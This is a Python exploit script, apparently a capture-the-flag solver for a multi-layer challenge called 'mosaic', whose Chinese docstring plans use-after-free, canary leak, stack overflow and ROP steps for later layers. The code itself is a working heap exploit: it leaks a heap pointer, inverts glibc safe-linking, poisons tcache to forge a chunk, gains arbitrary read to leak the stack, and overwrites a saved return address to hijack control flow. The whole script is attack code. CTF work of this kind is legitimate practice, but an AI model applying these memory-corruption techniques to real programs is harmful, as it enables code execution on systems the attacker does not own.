#!/usr/bin/env python3
"""12077 mosaic —— **已通：第 1 段 worker（本地跑出 "RELAY OK"）**。

进度线
======
  已通  L1 worker(mosaic)      : 本脚本；劫持到 relay FUN_001013e9 → fd0<->fd3 透明泵 → 直连 broker
  未通  L2 mosaic-broker       : relay 入口 0x1549（无 caller；UAF 任意读写 -> .got.plt/libc/environ -> 写返回地址 -> ROP call 0x1549）
  未通  L3 mosaic-keeper       : 桥 0x178b / ledger_handler 0x19b2（AUDIT 泄 canary + COMMIT 264B 栈溢出 -> ROP call）
  未通  L4 mosaic-seal         : relay 0x16f6（字节码负索引泄 PIE + 伪造门，纯协议，无需 ROP）
  未通  L5 routeledger         : 见 work/12077_mosaic/layers/ledger_council.md（op 0x7f 送 key；op 0x10 signed-char 负下标）
  未通  L6 routecouncil        : op 0x10 signed-char 门 + op 0x20 plan 链 + op 0x34 + op 0x40 GATE -> FUN_00102c90 读 fd4 回 flag
  （所有地址均为 PIE 内偏移；每层独立 ASLR，每段都要自己的泄漏）

第 1 段用法

用法（本地，需 work/12077_mosaic/local/ 下的 libc/ld/libpng 副本）：
    cd ~/ctf-2026/work/12077_mosaic
    source ~/re-tools/fw-env.sh
    python3 ../../scripts/12077-solve.py     # 依赖 work/12077_mosaic/{drive,probe,pngtool}.py
成功判据：最后打印 "RELAY OK"（stdin 写入的 PINGPING 出现在 fd3 上）。
细节与判据推导见 notes/12077-mosaic.md §5。
"""

import os, struct, sys, time
_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(_HERE, "..", "work", "12077_mosaic"))
import pngtool, drive

RELAY = 0x13E9          # unreferenced fd0<->fd3 bridge in mosaic
G_PNGCOPY = 0x9010      # global holding the png_struct copy pointer (Q's gate)
DELTA_A = -0x310        # A - B (adjacent chunks, stable across runs)
SLOT_DELTA = 0x120      # 16B-aligned stack qword just below the saved RIP; the
                        # saved RIP (at +8) is 8 mod 16, so tcache cannot target it directly
PNG_SCAN_LO = 0x2000
PNG_SCAN_HI = 0x400000


def p64(x):
    return struct.pack("<Q", x)


def inv_g(Y, nb=40):
    Q = 0
    for i in range(nb - 1, -1, -1):
        qi12 = (Q >> (i + 12)) & 1 if i + 12 < nb else 0
        Q |= (((Y >> i) & 1) ^ qi12) << i
    return Q


def recover_B(X):
    """X = (B>>12) ^ (B - 0x310)  ->  B"""
    Q = inv_g(X >> 12)
    r = ((X & 0xfff) ^ (Q & 0xfff)) + 0x310
    if r >= 0x1000:
        return None
    B = (Q << 12) | r
    return B if (B >> 12) ^ (B - 0x310) == X else None


class Worker:
    def __init__(self, pixels=(0, 1, 2, 3, 4, 5), target=None):
        self.pix = list(pixels)
        self.png = pngtool.make_png(self.pix)
        self.m = target if target is not None else drive.Mosaic()

    # ---------- framing ----------
    IO_T = 0.06

    def _ctl(self, op, payload=b""):
        self.m.frame(op, payload)
        return self.m.read(4, timeout=self.IO_T)

    def _raw(self, op, payload, n):
        self.m.frame(op, payload)
        return self.m.read(n, timeout=self.IO_T)

    def L(self, png=None): return self._ctl("L", png or self.png)
    def D(self): return self._ctl("D")
    def F(self): return self._ctl("F")
    def K(self): return self._ctl("K")
    def R(self): return self._ctl("R")
    def U(self): return self._ctl("U")
    def E(self, b18):
        assert len(b18) == 0x12
        return self._ctl("E", b18)
    def T(self, b768):
        assert len(b768) == 0x300
        return self._ctl("T", b768)
    def V(self, idx): return self._raw("V", bytes([idx]), 3)
    def P(self): return self._raw("P", b"", 18)
    def Q(self, svar=0): return self._raw("Q", struct.pack("<h", svar), 8)

    def leak_palette(self):
        return b"".join(self.V(p) for p in self.pix)

    def close(self):
        self.m.close()


def poison(target, B, ctrl=None):
    pay = bytearray(0x300)
    pay[0:8] = p64(target ^ (B >> 12))
    if ctrl:
        pay[0x48:0x48 + len(ctrl)] = ctrl
    return bytes(pay)


def reach_d3(w, log=lambda *a: None):
    """L, D, leak -> B, then E/F/D/K/E/D -> dstate 3, sealed 1, tcache [B, A]"""
    log("L", w.L())
    log("D", w.D())
    B = recover_B(int.from_bytes(w.leak_palette()[:8], "little"))
    if not B:
        raise RuntimeError("heap leak failed")
    log("E1", w.E(b"A" * 0x12))
    log("F", w.F())
    log("D2", w.D())
    log("K", w.K())
    log("E2", w.E(b"B" * 0x12))
    log("D3", w.D())
    return B


FAKE = 0x50           # 9020 = C+FAKE : inside [C, C+0x5b], fake chunk hdr at C+0x40
                      # (size field C+0x48 is T-controlled; user ptr is 16B aligned)


def ctrl(fake_size=0x311, read_addr=0):
    """payload for C+0x48.. : [0x48]=fake chunk size, [0x58]=tcache key, [0x70]=Q read addr"""
    c = bytearray(0x300 - 0x48)
    c[0x00:0x08] = p64(fake_size)      # C+0x48 -> size of fake chunk at C+0x40
    c[0x10:0x18] = p64(0)              # C+0x58 -> tcache key of that fake chunk
    c[0x28:0x30] = p64(read_addr)      # C+0x70 -> *(9020+0x20) used by Q
    return bytes(c)


def setup_cee(w, B, C, log=lambda *a: None):
    """poison so the next E's 2nd malloc == C+FAKE (valid fake chunk inside C)"""
    log("T", w.T(poison(C + FAKE, B, ctrl(0x311, 0))))
    r = w.E(b"\x00" * 0x12)
    log("E", r)
    return r in (b"OK\n",)


def find_pngcopy(w, B, C, lo=PNG_SCAN_LO, hi=PNG_SCAN_HI, step=0x8000, log=lambda *a: None):
    """Q's gate is [pngcopy, pngcopy+0x178]; scan candidates to find it exactly."""
    def ok(x):
        # only T+Q: Q is idempotent, E is not (each E needs a sealed cycle)
        w.T(poison(C + FAKE, B, ctrl(0x311, x)))
        return len(w.Q(0)) == 8
    x = B + lo
    hit = None
    while x < B + hi:
        if ok(x):
            hit = x
            break
        x += step
    if hit is None:
        return None
    a, b = hit - step, hit
    while b - a > 1:
        mid = (a + b) // 2
        if ok(mid):
            b = mid
        else:
            a = mid
    return b


def read64(w, B, C, addr):
    w.T(poison(C + FAKE, B, ctrl(0x311, addr)))
    return w.Q(0)


def hijack(w, B, C, slot, base, S, log=lambda *a: None):
    """R frees C + B -> tcache [B, C]; poison B.next = slot; E writes relay addr at slot"""
    log("T0", w.T(poison(C + FAKE, B, ctrl(0x311, 0))))
    log("R", w.R())
    log("T2", w.T(poison(slot, B)))
    # [S+0x120]=saved rbp of the E handler (must stay a valid stack ptr,
    # otherwise main's epilogue dereferences [rbp-8] and dies), [S+0x128]=saved RIP
    log("E4", w.E(p64(S + 0x150) + p64(base + RELAY) + b"\x00" * 2))


# ---------------- local harness (asserts against /proc ground truth) ----------
def main():
    import probe
    pr = probe.Probe()
    w = Worker(target=pr.m)
    B = reach_d3(w, log=lambda tag, r=b"": print(tag, r))
    C = pr.globals()["C"]
    base = pr.base()
    print("B=%#x C=%#x base=%#x" % (B, C, base))
    assert setup_cee(w, B, C), "E failed"
    png = find_pngcopy(w, B, C, log=lambda *a: None)
    print("pngcopy =", hex(png) if png else None)
    assert png and png == pr.globals()["PngCopy"], "pngcopy scan wrong"
    S = struct.unpack("<Q", read64(w, B, C, png + 0x108))[0]
    print("stack io_ptr S = %#x" % S)
    slot = S + SLOT_DELTA
    hijack(w, B, C, slot, base, S, log=lambda tag, r=b"": print(tag, r))
    time.sleep(0.2)
    os.write(w.m.w, b"PINGPING")
    time.sleep(0.4)
    w.m.sock_ours.setblocking(False)
    try:
        got = w.m.sock_ours.recv(64)
    except BlockingIOError:
        got = b""
    print("fd3 received:", got, "RELAY OK" if got == b"PINGPING" else "RELAY FAIL")
    pr.close()


if __name__ == "__main__":
    main()
